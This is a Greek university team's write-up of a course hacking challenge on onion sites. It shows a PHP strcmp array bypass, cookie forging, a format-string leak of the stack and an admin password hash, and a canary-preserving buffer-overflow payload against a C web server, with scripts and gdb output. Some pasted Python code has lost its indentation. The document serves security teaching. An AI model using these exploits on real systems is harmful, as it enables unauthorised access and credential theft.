# Όνομα ομάδας: hackerz - Εργασία 2
**Μέλη**:
 - Κώστας Χατζόπουλος - 1115201300202
 - Βασίλειος Πουλόπουλος - 1115201600141


## Ερώτημα 1 
Για να απαντήσουμε την ερώτηση "**Που βρισκεται ο Γιώργος;**" ακολουθήσαμε την παρακάτω διαδικασία:

Αρχικά, πλοηγηθήκαμε στο site ( http://2fvhjskjet3n5syd6yfg5lhvwcs62bojmthr35ko5bllr3iqdb4ctdyd.onion ) , στον κώδικα html και στα cookies. Τα 2 πράγματα που μας κίνησαν το ενδιαφέρον ήταν το σχόλιο στον κώδικα αλλά και το οτι μέσω του cookie μπορούσαμε να αλλάξουμε τον αριθμό των visitors.
### Για το σχόλιο
Μπήκαμε στο άρθρο που είχε το σχόλιο (https://blog.0day.rocks/securing-a-web-hidden-service-89d935ba1c1d) και δοκιμάζαμε ότι έλεγε μήπως βρίσκαμε κάτι που δεν είχε γίνει. Πράγματι, το path **/server-info** (http://2fvhjskjet3n5syd6yfg5lhvwcs62bojmthr35ko5bllr3iqdb4ctdyd.onion/server-info) δεν ήταν κλειδωμένο και μπήκαμε να δούμε αν θα βρούμε πληροφορίες που μας ενδιαφέρουν. 

Βρήκαμε **(1)** πως υπάρχει και **προσωπικό site του ys13** το οποίο βρισκόταν σε άλλο link (http://jt4grrjwzyz3pjkylwfau5xnjaj23vxmhskqaeyfhrfylelw4hvxcuyd.onion/) και οδηγεί σε μία φόρμα εισόδου που ζητάει κωδικό και **(2)** πως επιτρέπεται η είσοδος σε αρχεία με κατάληξη **.phps**. 

### Για το cookie
Παρατηρήσαμε πως το cookie ήταν ένα string της μορφής **base64(number:sha256(number))** οπότε βάζοντας στο number οτιδήποτε, μπορούσε να τυπωθεί στη σελίδα κάτω από το visitor number. Έτσι, φτιάξαμε ένα script (cookie.py) στο οποίο δίναμε την είσοδο που θέλαμε και υπολόγιζε το αντίστοιχο cookie.

**cookie.py:**
```python
from hashlib import sha256
from base64 import b64encode

print("Give input")
x = input()
y = sha256(x.encode())
y = y.hexdigest()
final = x+":"+y
encoded = b64encode(final.encode('ascii'))
print(encoded.decode('ascii'))
```

### Personal YS13 website
Μέσω του html κώδικα της φόρμας εισόδου, είδαμε ότι έκανε GET request στο path **/access.php**. 
Αφού επιτρέπεται η είσοδος στα **.phps** αρχεία, δοκιμάσαμε να μπούμε στο **/access.phps** (http://jt4grrjwzyz3pjkylwfau5xnjaj23vxmhskqaeyfhrfylelw4hvxcuyd.onion/access.phps) και τα καταφέραμε.
Έτσι, είχαμε πλέον πρόσβαση στον κώδικα του αρχείου **access.php** που φαίνεται παρακάτω και για να συνεχίσουμε έπρεπε να υπολογίσουμε το περιεχόμενο της μεταβλητής **$desired** καθώς και έναν τρόπο να διαπεράσουμε τον έλεγχο της **strcmp** για το password.

**access.php:**
```php
<?php
// get $secret, $desired and $passwd from this file
// i set $desired to the 48th multiple of 7 that contains a 7 in its decimal representation
require_once "secret.php";

if ((((((((((((((((((intval($_GET['user']) !== $desired) || (strlen($_GET['user'])) != 7))))))))))))))))) {
    die("bad user...\n");
}
if ( isset ($_GET[ 'password' ])) {
   if (strcmp($_GET[ 'password' ], $passwd) != 0 ){
     die("bad pass...\n");
   }
}else {
   die("no pass...\n");
}

// authenticated under YS13's dynamic authentication. greet the user!
echo $secret
?>
```


Tο περιεχόμενο της μεταβλητής **$desired** το υπολογίσαμε μέσω script που φτιάξαμε (desired.py)

**desired.py:**
```python
number = 7
p = 1
mult = 0
counter = 0
while  1:
    mult = p*number
    if (str(mult)).count('7') != 0: 
	    counter += 1    
	    print(str(counter) + ": " + str(mult))    
    if counter == 48:    
	    print(mult)    
	    break    
    p += 1
```

και μας έβγαλε τον αριθμό **1337**, αλλά έπρεπε το μέγεθος του **$desired** να είναι 7, οπότε βάλαμε για username τον αριθμό **0001337**, ο οποίος ήταν και ο σωστός. 

Για το password ψάξαμε αν μπορούμε να διαπεράσουμε την **strcmp** της php. Ψάχνοντας στο google, βρήκαμε αυτό το [άρθρο](https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016). Στείλαμε το password σαν **array** και η strcmp μας γύρισε **NULL** αντί για error. Στην php ισχύει ότι **NULL == 0**, οπότε διαπεράσαμε τη συνθήκη της if. (http://jt4grrjwzyz3pjkylwfau5xnjaj23vxmhskqaeyfhrfylelw4hvxcuyd.onion/access.php?user=0001337&password[]=%22%22) και άνοιξε μια νέα λευκή σελίδα όπου είχε το εξής μήνυμα:
> Hi! You can find my blog posts at directory: /blogposts7589109238!

Μπήκαμε στα **blog posts** (http://jt4grrjwzyz3pjkylwfau5xnjaj23vxmhskqaeyfhrfylelw4hvxcuyd.onion/blogposts7589109238 ) και κάναμε access τον φάκελο που περιέχει τα post (http://jt4grrjwzyz3pjkylwfau5xnjaj23vxmhskqaeyfhrfylelw4hvxcuyd.onion/blogposts7589109238/blogposts/). 

Εκτός από τα posts (**diary.html**, **diary2.html**) βρήκαμε και το **post3.html** όπου περιέχει το παρακάτω περιεχόμενο:

> case notes (unfinished)
> 
> A weirdo (Giorgos Komninos) brought me this iphone today. He was
> definitely in a paranoid state saying that "raccoon" is the secret
> over and over...
> 
> theory: the phone is loaded with more than 20 different
> "anti-tracking" applications. that's probably why it's not working
> 
> i'll try a factory reset and see how that works.
> 
> i left the phone backup in the standard secret backup location in
> fixers that only the winner visitor #100013 will find...

Διαβάζοντάς το, κρατήσαμε δύο πράγματα που φανταζόμασταν ότι θα μας ήταν χρήσιμα:
1) Τη λέξη "**raccoon**" 
2) Την τελευταία πρόταση που έλεγε πως  τα backup θα τα βρεί ο **#100013 χρήστης** που θα μπει στο site. 

Έχοντας τη δυνατότητα στην αρχική σελίδα να αλλάξουμε το visitor number μέσω του cookie, το αλλάξαμε σε 100013 και έτσι, εμφανίστηκε το παρακάτω μήνυμα:

>  Visitor number
> Congrats user #100013! Check directory /sekritbackups2444 for latest
> news... 

Έτσι, ανοίγοντας το λινκ http://2fvhjskjet3n5syd6yfg5lhvwcs62bojmthr35ko5bllr3iqdb4ctdyd.onion/sekritbackups2444/, βρήκαμε τα παρακάτω backup files: 

1) firefox.log.gz.gpg
2) notes.txt.truncated
3) passphrase.key.truncated	 
4) signal.log.gpg 

Διαβάσαμε το περιεχόμενο του αρχείου **notes.txt.truncated** όπως φαίνεται παρακάτω και είδαμε πως κάνει το encrypt για τα αρχεία του. 

**notes.txt.truncated:**
> entry #79:
> 
> so i recently found this software called gpg which is capable of
> encrypting my files, and i came up with a very smart and
> easy-to-remember way to finally keep my data secret:
> 
> First of all, I generate a random passphrase using the SHA256 hash
> algorithm, and then I save it on disk in hex as "passphrase.key". In
> particular, here is how to generate the key:
> 
>     key = SHA256(<current date in RFC3339 format> + " " + <secret string>)
> 
>     e.g. so if the secret string is "cement" then the key would be:
>              key = SHA256("2020-05-18 cement") = cadf84c9706ff4866f8af17d3c0e3503da44aea21c2580bd6452f7a1b8b48ed2
> 
> Then I use the gpg software to encrypt my files using the
> passphrase.key file:
> 
>     $ gpg --symmetric --passphrase-file passphrase.key --batch plaintext.txt
> 
> I then delete all the unencrypted files and the key files and just
> leave the encrypted files behind.
> 
> This way, if you don't know the date and the secret string there is no
> reason to even try... Seriously this secret string is super secret and
> I would never say it to anyone....
> 
> XXX don't forget to delete this file, the key and the script before
> crossing borders
> 
> XXX i've noticed that sometimes my file deletion script has issues and
> leaves
>     corrupted truncated files beh

Υποθέσαμε πως το "**raccoon**" είναι το string που θέλαμε αντί για το "**cement**" αλλά δεν ξέραμε την ημερομηνία. Έτσι φτιάξαμε ένα script (decrypt.py) το οποίο δοκίμαζε όλες τις ημερομηνίες του 2020 με τη λέξη "raccoon" και τέλος βρήκαμε τη σωστή ημερομηνία η οποία ήταν η "**2020-2-12**". 

**decrypt.py:**
```python
import hashlib
import os

def encrypt_string(hash_string):
sha_signature = \
    hashlib.sha256(hash_string.encode()).hexdigest()
return sha_signature

for y in range(1, 12):
for i in range(1, 31):
    x = "2020-" + "{:02d}".format(y) + "-" + "{:02d}".format(i) + " raccoon"
    print(x)
    sha_signature = encrypt_string(x)
    cmd1 = 'echo ' + sha_signature + ' | gpg --batch --yes --passphrase-fd 0 /home/msi/Desktop/sekritbackups2444/firefox.log.gz.gpg'
    cmd2 = 'echo ' + sha_signature + ' | gpg --batch --yes --passphrase-fd 0 /home/msi/Desktop/sekritbackups2444/signal.log.gpg'
    print(cmd1)
    os.system(cmd1)
    os.system(cmd2)
```

Έχοντας τη σωστή ημερομηνία, κάναμε **decrypt** με επιτυχία τα αρχεία:
1) firefox.log.gz.gpg. 
2) signal.log.gpg

Παρατηρήσαμε ότι το αρχείο firefox.log είχε εκατομμύρια γραμμές όπου εμφανιζόταν η πρόταση "**https://en.wikipedia.org/wiki/The_Conversation**"  και αποφασίσαμε να κάνουμε drop κάθε γραμμή που εμπεριείχε αυτή την πρόταση για να δούμε αν θα μείνει κάποια γραμμή διαφορετική τρέχοντας το bash script (remove.sh)

**remove.sh:**
```bash
grep -v "https://en.wikipedia.org/wiki/The_Conversation" firefox.log > out.txt
```

 για να φύγουν όλα τα link του wikipedia και πράγματι υπήρχε μια διαφορετική γραμμή η οποία είχε link σε κάποιο repository του Github (https://github.com/asn-d6/tor/).  

Εξερευνόντας προσεκτικά τα commit στο repository, παρατηρήσαμε το τελευταίο commit που είχε κάνει ο κύριος George Kadianakis. Το link ήταν το: [https://github.com/asn-d6/tor/commit/9892cc3b12db4dc1e8cbffec8e18bb18cbd77d0f](https://github.com/asn-d6/tor/commit/9892cc3b12db4dc1e8cbffec8e18bb18cbd77d0f). 

Έπειτα, ανοίξαμε το αρχείο **signal.log** και είδαμε τα παρακάτω περιεχόμενα: 

```text
22 Feb 15:18 - You:    Hey Maria :)
23 Mar 20:44 - You:    Maria? I need a favor.
24 Mar 13:32 - You:    Maria, I passed from your place the other day but you were not there. Please call me it's urgent.
24 Mar 13:34 - Maria:  ???
25 Mar 13:35 - You:    HEy Maria! I'm trying to make sense of the inbetweens. I think I'm part of some weird game other people are playing on me...
25 Mar 13:35 - You:    my flat got poisoned by those people and im now sleeping in the balcony.
25 Mar 13:35 - You:    the neighbors are looking at me when i sleep.
25 Mar 13:36 - You:    i saw a girl in the eleveator yesterday holding a plant with big branches. she started talking to me. i didnt naswer. i think.
25 Mar 13:36 - You:    my mobile phone is broken. its tracking me and sending details to those men. i need to send it for repair.
25 Mar 13:37 - You:    i think im not well. need to escape this city. they are looking at me. i dont git why...
25 Mar 13:37 - You:    please come and find me. you are the only person i can commit to: 2355437c5f30fd2390a314b7d52fb3d24583ef97
25 Mar 13:38 - You:    hope to see you soon! thanks!>
25 Mar 17:12 - Maria:  ??? What are you talking about? I'm not Maria. I think you got the wrong number mate.
```

Παρατηρήσαμε πως στο 11ο μύνημα, υπάρχει ο κωδικός hash **2355437c5f30fd2390a314b7d52fb3d24583ef97** και η λέξη **commit**. Έτσι σκεφτήκαμε να αντικαταστήσουμε τον κωδικό του τελευταίου commit στο παραπάνω url με αυτόν που πήραμε από το αρχείο signal.log ([https://github.com/asn-d6/tor/commit/2355437c5f30fd2390a314b7d52fb3d24583ef97](https://github.com/asn-d6/tor/commit/2355437c5f30fd2390a314b7d52fb3d24583ef97)). 

Όταν ανοίξαμε το commit είδαμε τις εξής αλλαγές:
```diff
- /** Set the default values for a service configuration object <b>c</b>. */
+ /** Hey maria... I need you to come and find me. I'm hiding in a place produced
+  *  by my polymorphic geolocation algorithm.
+ *
+  *  You can find my coordinates by doing the following trick:
+  *  1) Calculate hexdigest = SHA256(<team name>). So for example the hexdigest of
+  *     SHA256("YS13Hey") is:
+  *         aea0f148fcabc595acb43d0945e6a36f538eceda8794bcb04d2dc16274ed9c68.
+  *
+  *  2) From that digest, derive two strings: x = hexdigest[16:] and y = hexdigest[16:32]
+  *
+  *  3) Convert those two hexadecimal strings into a decimal number by first
+  *     prepending "0."  and converting to a decimal fraction. Examples:
+  *           "0.aea0f148fcabc595" -> 0.682143287963...
+  *           "0.acb43d0945e6a36f" -> 0.674625220073...
+  *
+  *  4) Use the first half as the latitude and the second half as the longitude,
+  *     and use 47 and 4 as the integer part of the decimals respectively. So in
+  *     this case the above example becomes: (47.682143287963, 4.674625220073632)
+  *
+  * See you there!
+  *
+  * PS: I don't know what <team name> means but I hope you do....
+  */
+
```
Έτσι φτάσαμε στις οδηγίες για την εύρεση των συντεταγμένων όπου για **\<team name>** βάλαμε το όνομα της ομάδας μας "**hackerz**" και βρήκαμε τις συντεταγμένες:
> 47.5284864714, 4.8260977302

## Ερώρημα 2
Για να απαντήσουμε την ερώτηση "**Τι λείπει για να ολοκληρώθει το "Plan X";**" ακολουθήσαμε την παρακάτω διαδικασία: 

Ανοίγοντας το diary2.html (http://jt4grrjwzyz3pjkylwfau5xnjaj23vxmhskqaeyfhrfylelw4hvxcuyd.onion/blogposts7589109238/blogposts/diary2.html), είδαμε μια γαλάζια σελίδα με το παρακάτω περιεχόμενο:

```
Blog entry #2

I know you all want to learn about my hobbies and interests!

Due to the sensitive nature of my affiliation with the "Plan X" group I'm not just writing this stuff out here for all the creeps to see it.

Fortunately, a valued customer with a cool black hat recently gave me a secure interface for storing sensitive information. He said that it's even open source and ultra secure: https://github.com/chatziko/pico

I set it up on 4tpgiulwmoz4sphv.onion! Check it out but please come by the store (when we open) and ask me for the password first.
```
και αυτό που μας έκανε εντύπωση ήταν:
1) Το link του github με τον κώδικα του pico server (https://github.com/chatziko/pico) και 
2) το link για τον server [4tpgiulwmoz4sphv.onion](4tpgiulwmoz4sphv.onion).

Στήσαμε τον pico server στα μηχανήματά μας ώστε να τον τεστάρουμε και να δούμε τον κώδικα αναλυτικά. 

Αρχικά είδαμε το παρακάτω "**TODO**" σχόλιο (main.c:25): 

```c
// TODO: gcc 7 gives warnings, check
```
το οποίο ενημερώνει πως κατά τη μεταγλώτιση θα υπάρχουν warnings και πράγματι ο **gcc** δίνει το παρακάτω warning:

```bash
main.c: In function ‘check_auth’:
main.c:135:5: warning: format not a string literal and no format arguments [-Wformat-security]
     printf(auth_username);
     ^
```
Έτσι, παρατηρήσαμε πως κάτι δεν πάει καλά με την εντολή printf (main.c:135) και ότι είναι vulnerable σε επιθέσεις διότι δεν παίρνει ριτά το output format, αφήνοντας έτσι το χρήστη να βάλει το δικό του format με ότι αυτό συνεπάγεται.

Εκμεταλλευόμενοι αυτήν την ευπαθεια, τυπώσαμε addresses βάζοντας για input μερικά **%08x** και πράγματι μας τα τύπωνε. Στη συνέχεια βάλαμε **%s** στο τέλος των **%08x** οπότε αν υπήρχε κάποιο string εκεί θα τυπωνόταν.

Έτσι, αρχίσαμε από την πρώτη διεύθυνση να προσπαθούμε να τυπώσουμε κάποιο string, αν δε βρίσκαμε κάτι, προσθέταμε ένα **%08x** πριν το **%s** ωστε να πάμε στην επόμενη διεύθυνση να τυπώσουμε το string. Αυτό το συνεχίσαμε μέχρι να βρούμε κάτι χρήσιμο. 

Φτιάξαμε ένα script που μας έφτιαχνε το input με όσα **%08x** θέλαμε (input.py).

**input.py:**
```python
import os

from base64 import b64encode    
x =  '%08x '    
baseInput =  "%08x "     

for i in  range(0, 5):    
    baseInput = baseInput + x    
baseInput +=  "%s:lalala"    
encoded = b64encode(baseInput.encode('ascii'))
print(baseInput)    
curl =  "curl -I 'http://127.0.0.1:8000/' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:77.0) Gecko/20100101 Firefox/77.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Authorization: Basic "  + encoded.decode('ascii') +"'"    
print(curl)    
os.system(curl)    
print('\n\n')
```    

Μετά από μερικές προσπάθειες βρήκαμε τα στοιχεία του πρώτου χρήστη (ήταν της μορφής **name:md5(password)**) που βρίσκονταν στο αρχείο **passwd**. 

Μεταφέραμε ακριβώς το ίδιο input (**%08x %08x %08x %08x %08x %08x %s**) στον server της άσκησης και το output ήταν το παρακάτω: 

> http://4tpgiulwmoz4sphv.onion is requesting your username and
> password. The site says: “Invalid user:  5807d010 15 5656951d ffffffff
> d00 5806d155 admin:f68762a532c15a8954be87b3d3fc3c31”


Άρα το **md5 hash** του κωδικου του χρήστη **admin** είναι: **f68762a532c15a8954be87b3d3fc3c31**

Έπειτα, ψάξαμε σε μερικά site το md5 hash για να το κάνουμε **decrypt** και μετά από μερικές προσπάθειες βρήκαμε το site [https://md5.gromweb.com/?md5=f68762a532c15a8954be87b3d3fc3c31](https://md5.gromweb.com/?md5=f68762a532c15a8954be87b3d3fc3c31) το οποίο μας έδωσε το password "**you shall not pass**" :D

Τέλος, αποκτήσαμε πρόσβαση στο site http://4tpgiulwmoz4sphv.onion και είδαμε μια λευκή σελίδα με το παρακάτω περιεχόμενο:
```
Welcome to the YS13 oasis! <3

Over the past 5 years we've been evolving YS13 to fit a greater range of research activities
while also being in contact with fellow enterpreneurs who help us monetize and bring our goals
reality.

We have a long list of projects to get where we want, but our next priority is "Plan X":
that is, building an indoors greenhouse so that we can finally cultivate onions and avocados when we
send our initial colony on Saturn.

We are missing a "solar wind analyzer" to be able to proceed with this plan.
If you see this page and you have one, please bring it to the YS13 store and we will count you in as a project backer.

Love you big time!

```
Οπότε καταλήξαμε στο συμπέρασμα ότι η απάντηση βρισκόταν εκεί και συγκεκριμένα στην πρόταση "**We are missing a "solar wind analyzer" to be able to proceed with this plan.**". 

Για να ολοκληρωθεί το Plan X χρείάζεται ένας **ηλιακός  αναλυτής ανέμου**...

## Ερώρημα 3
Για να απαντήσουμε την ερώτηση "**Ποια ειναι τα results του "Plan Y";**" ακολουθήσαμε την παρακάτω διαδικασία:

Έχοντας αποκτήσει πρόσβαση στο site http://4tpgiulwmoz4sphv.onion από το προηγούμενο ερώτημα, είδαμε στο κάτω μέρος της λευκής σελίδας τα παρακάτω χρήσιμα tips:
```
PS1. Neat trick, run this (with the tor browser open) and you can access
foo.onion with a normal browser under http://localhost:8000

socat TCP4-LISTEN:8000,bind=127.0.0.1,fork SOCKS4A:localhost:foo.onion:80,socksport=9150

PS2. As always a big part of the YS13 mission is research. Reaching Saturn is not easy.
Lately we've been finishing the experiments for "Plan Y" which is finding the actual value of the ultimate coefficient.
Check the page below for some preliminary results. This is strictly for admins now so as to not
further destabilize the space-plant continuum.
```
καθως και μια **φόρμα εισόδου** η οποία κάνει post request στο path http://4tpgiulwmoz4sphv.onion/ultimate.html. Ετσι αρχίσαμε να βλέπουμε λίγο τον κώδικα του [pico server](https://github.com/chatziko/pico) για να καταλάβουμε την ροή που θα ακολουθήσει για να επεξεργαστεί το request και τέλος να στείλει κάποιο αποτέλεσμα πίσω στον client. 

Αρχικά ο server οταν ξεκινάει, καλεί την συνάρτηση **server_forever** η οποία περιμένει συνδέσεις στην θύρα **8080** χρησιμοποιώντας την blocking συνάρτηση **accept**. Τη στιγμή που θα έρθει κάποιο αίτημα, η κατάσταση του process θα αλλάξει από **block**/**wait** σε **running** ξανά και αμέσως μετά θα γίνει **fork** έτσι ώστε να εξυπυρετήσει τον **client** στον κώδικα του child process. Στη συνέχεια το child process θα καλέσει τη συνάρτηση **respond** η οποία αναλαμβάνει να χειριστεί το request, να θέσει το standard output να πηγαίνει κατευθείαν στο **socket** εκτελώντας την εντολή:
```c
dup2(clientfd, STDOUT_FILENO);
```
και να καλέσει την συνάρτηση **route** η οποία θα εξετάσει τα **headers** του request για να ελέγξει ποιο path ζητάει να δει ο client καθώς και αν είναι προστατευμένο με κωδικό. 

Στην περίπτωση του path http://4tpgiulwmoz4sphv.onion/ultimate.html η route πρέπει να τρέξει τον παρακάτω κώδικα: (main.c:50)
```c
ROUTE_POST("/ultimate.html") {  
  // An extra layer of protection: require an admin password in POST  
  Line admin_pwd[1];  
  read_file("/etc/admin_pwd", admin_pwd, 1);  
  
 char* given_pwd = post_param("admin_pwd");  
 int allowed = given_pwd != NULL && strcmp(admin_pwd[0], given_pwd) == 0;  
  
 if (allowed)  
    serve_ultimate();  
 else  printf("HTTP/1.1 403 Forbidden\r\n\r\nForbidden");  
  
  free(given_pwd);  
}
```
και αν περάσει ο έλεγχος του password να εκτελεστεί η συνάρτηση **server_ultimate** η οποία αναλαμβάνει να στείλει πίσω στον client το περιεχόμενο του αρχείου **ultimate.html**.

Για να γίνει αυτό, πρέπει να κληθεί η συνάρτηση **post_param** (main.c:169) η οποία αναλαμβάνει να κάνει parse το payload για να πάρει την τιμή της παραμέτρου **admin_pwd** και να την επιστρέψει ώστε να γίνει η σύγκριση. 

**post_param (main.c:169):**
```c
// Parses and returns (in new memory) the value of a POST param  
char* post_param(char* param_name) {  
  // These are provided by pico:  
 //  payload      : points to the POST data //  payload_size : the size of the paylaod  
 // The POST data are in the form name1=value1&name2=value2&... // We need NULL terminated strings, so change '&' and '=' to '\0' // (copy first to avoid changing the real payload).  
  char post_data[100];  
  memcpy(post_data, payload, payload_size+1);  
  
 for (int i = 0; i < payload_size; i++)  
    if (post_data[i] == '&' || post_data[i] == '=')  
      post_data[i] = '\0';  
  
  // Now loop over all name=value pairs  
  char* value;  
 for (  
    char* name = post_data;  
  name < &post_data[payload_size];  
  name = &value[strlen(value) + 1]      // the next name is right after the value  
  ) {  
    value = &name[strlen(name) + 1]; // the value is right after the name  
  if (strcmp(name, param_name) == 0)  
      return strdup(value);  
  }  
  
  return NULL; // not found  
}
```
Παρατηρήσαμε ότι το input που δίναμε το έπαιρνε  η συνάρτηση **memcpy** για να το αντιγράψει στον πίνακα **post_data** και για μήκος χρησιμοποιούσε τo μήκος του input + 1 (payload_size + 1 ). Οπότε αν δίναμε είσοδο πάνω από 100 χαρακτήρες η **memcpy** θα έκανε πάνω από 100 αντιγραφές με αποτέλεσμα να μπορούμε να κάνουμε **buffer overflow**.

### Ανάλυση επίθεσης

Στη συνέχεια τρέξαμε τον server με gdb για δούμε την δομή της στοίβας στο frame της συνάρτησης **post_param**.

Αμέσως μετά κάναμε κλήση της συνάρτησης memset όπως φαίνεται παρακάτω ώστε να γεμίσουμε τον buffer με 'Α' για να μας είναι πιο ξεκάθαρο το περιεχόμενο του frame:
```bash
>>> call memset(post_data, 'A', 100)
```
Οπότε τώρα το frame της συνάρτησης **post_param** φαίνεται κάπως έτσι:
```bash
>>> x/39xw $sp
0xbfffee60:	0xb7c86117	0x00417188	0x00000000	0x0040239f
0xbfffee70:	0x00417188	0x00000000	0xb7c88b19	0xb7dcd000
0xbfffee80:	0x00417188	0x00000000	0x41414141	0x41414141
0xbfffee90:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffeea0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffeeb0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffeec0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffeed0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffeee0:	0x41414141	0x41414141	0x41414141	0x786f3100
0xbfffeef0:	0x00404000	0x00404000	0xbfffef98
```
Έτσι, είδαμε ότι μετά τα 100 στοιχεία του buffer ήταν το **canary (0x786f3100)** , **δυο ίδιες διευθύνσεις σταθερές (0x00404000)**, και o **saved $ebp (0xbfffef98)**.  Αν εκτυπώναμε 40 hex words, θα βλέπαμε στο τέλος και τον **saved $eip**.

Το επόμενο word μετά από τον **saved $ebp** είναι ο **saved $eip** και για να τον τυπώσουμε χρησιμοποιήσαμε την παρακάτω εντολή:

```bash
>>> x/a $ebp + 4
0xbfffeefc:	0x401193 <route+384>
```
### Επίθεση

Σκοπός μας ήταν να αλλάξουμε τη διεύθυνση του **saved $eip**, να κάνουμε την συνάρτηση **post_param** να επιστρέψει μεσα στο **if(allowed)** και να κληθεί η συνάρτηση **serve_ultimate**. Εν τέλη αποφασίσαμε να κάνουμε την συνάρτηση **post_param** να επιστρέψει μέσα στην συνάρτηση **serve_ultimate**. Επομένως, αλλάξαμε την τιμή του **saved $eip** από τον **gdb**, της δώσαμε την τιμή της διεύθυνσης εντολής **<serve_ultimate+18>** και πράγματι ο κώδικας συνέχισε να εκτελείται από εκείνη την εντολή και μετά, δηλαδή μέσα στην συνάρτηση **serve_ultimate** με αποτέλεσμα να δούμε τα περιεχόμενα του αρχείου **ultimate.html**.

Για να γίνει το attack έπρεπε να κάνουμε ένα buffer overflow στο οποίο όλα τα στοιχεία μετά τον buffer θα παραμείνουν ίδια εκτός από τον **saved $eip**. Για αυτό το λόγο έπρεπε να ξέρουμε την τιμή του **canary**, του  **saved $ebp** και τις **2 ενδιάμεσες διευθύνσεις** που είχαμε παρατηρήσει ότι παρέμεναν σταθερές. 

Για να βρούμε τις τιμές που χρειαζόταν να παραμένουν ίδιες, χρησιμοποιήσαμε την **vulnerable printf** του ερωτήματος 2 και τυπώσαμε το frame της **check_auth** όπως αυτό εμφανίζεται στη στοίβα. Για μάθουμε το μέγεθος του, τρέξαμε την εντολή:

```bash
>>> p ($ebp - $esp) / 4
```
στο shell του gdb, το οποίο μας έφερε το αποτέλεσμα 31 έτσι βρήκαμε τον αριθμό των words του frame και ξέραμε πόσα **%x** να βάλουμε ως είσοδο στην **vulnerable printf** για να δούμε το frame, επίσης προσθέσαμε αλλο ένα **%x** για να μας γυρίσει τον **saved $eip**

Το αποτέλεσμα της printf ήταν:

```
00417010 0000009b 004014ba ffffffff 00000d00 00407161 00404260 b7fff000 b7fff918 00417010 000000a2 00000000 00000001 00417010 004170ab 004170ac 0000009b b7c26da8 b7fd5480 b7fe4a70 00400540 00000001 b7fff918 004040cc b7fe98a2 b7fffad0 786f3100 b7c831d7 00404000 bfffef98 00401085
```
όπως φαίνεται και στο output, 
1) το **canary** (**786f3100**) είναι το ίδιο. 
2) διακρίνουμε τη σταθερή τιμή (**00404000**).
3) το **saved $ebp**  (**bfffef98**) είναι το ίδιο όπως περιμέναμε αφού και οι 2 συναρτήσεις επιστρέφουν στη συνάρτηση **route()**.

Επαναλάβαμε τη διαδικασία με την printf στον remote server αυτή τη φορά και έτσι μάθαμε τις διευθύνσεις που μας ενδιέφεραν.

```
58628010 0000009b 5664151d ffffffff 00000d00 58618161 56644260 f77d5000 f77d5918 58628010 000000a2 00000000 00000001 58628010 586280ab 586280ac 0000009b f7408da8 f77ad480 f77baa70 56640550 00000001 f77d5918 566440cc f77bf8a2 f77d5ad0 61fdc200 f74651d7 56644000 ffff8b68 566410e8
```

1) το **canary** έχει την τιμή **61fdc200**. 
2) η αντίστοιχη σταθερή τιμή είναι η **00404000**.
3) ο αντίστοιχος **saved $ebp**  είναι ο **ffff8b68**
4) ο saved $eip είναι ο **566410e8**

Το μόνο που χρειαζόμασταν ήταν η διεύθυνση της εντολής **<serve_ultimate+18>** στον remote server. 

Για να την υπολογίσουμε χρειαζόμασταν τη διαφορά (**offset**) της remote διευθυνσης από την local διεύθυνση. Για να βρούμε τη διαφορά, αφαιρέσαμε από τη διεύθυνση του **saved $eip** στο remote server την διευθυνση του **saved $eip** στον local server και το αποτέλεσμα το προσθέσαμε στη διεύθυνση της **<serve_ultimate+18>** στο local server.

### Τελική επίθεση

Τέλος σχεδιάσαμε το input που θα κάναμε το attack, το οποίο ήταν της μορφής:

> 'Α' * 100 + Canary + Constant address * 2 + Saved $ebp + <serve_ultimate+18> address

Για να κάνουμε τις δοκιμές στον remote server, τρέξαμε την εντολή socat:
```bash
socat TCP4-LISTEN:8000,bind=127.0.0.1,fork SOCKS4A:localhost:4tpgiulwmoz4sphv.onion:80,socksport=9150
```

εχοντας ανοικτό το tor service και στην συνέχεια εκτελέσαμε το script request.py για να κάνουμε το request.

**request.py:**
```python
import requests

headers = {
'U': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:77.0) Gecko/20100101 Firefox/77.0',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
'Accept-Language': 'en-US,en;q=0.5',
'Content-Type': 'application/x-www-form-urlencoded',
'Origin': 'http://127.0.0.1:8000',
'Authorization': 'Basic YWRtaW46eW91IHNoYWxsIG5vdCBwYXNz',
'Connection': 'keep-alive',
'Referer': 'http://127.0.0.1:8000/',
'Upgrade-Insecure-Requests': '1',
}

#canary = i.to_bytes(4, byteorder='little')
data = b'A' * 100               # <-- buffer
data += b'\x00\xe2\x4c\xe7'     # <-- canary
data += b'\x00\x70\x5c\x56'     # <-- canary
data += b'\x00\x70\x5c\x56'     # <-- canary
data += b'\x78\x58\x8e\xff'     # <-- saved $ebp
data += b'\x6d\x49\x5c\x56'     # <-- saved $eip
try:
response = requests.post('http://127.0.0.1:8000/ultimate.html', headers=headers, data=data)
status_code = response.status_code
print("status_code = [" + str(status_code) + "]")
print("text = [" + response.text+ "]")
except requests.exceptions.RequestException as e:
print(e)
```
Τα results του “Plan Y” είναι:

 > Results:
> 
> 41.99334111122333
> 
> Preliminary results, the answer is approximate. Our supercomputer is
> working on it but it's taking forever.
> 
> The log is here: /var/log/z.log

### Debugging
Ο server κάνει **fork** για κάθε αίτημα από τον client όπως αναφέρθηκε παραπάνω και ο target κώδικας που μας ενδιέφερε για να κάνουμε το **buffer overflow** είναι κώδικας που τον τρέχει το child process με αποτέλεσμα, κάθε φορά που θέλαμε να σταματήσουμε στην εντολή **memcpy** (main.c:179) με breakpoint να χρειάζεται πρώτα να σταματήσουμε κάπου πριν γίνει το **fork** (πχ httpd.c:58) και μετά με την gdb εντολή:
```bash
set follow-fork-mode child
```
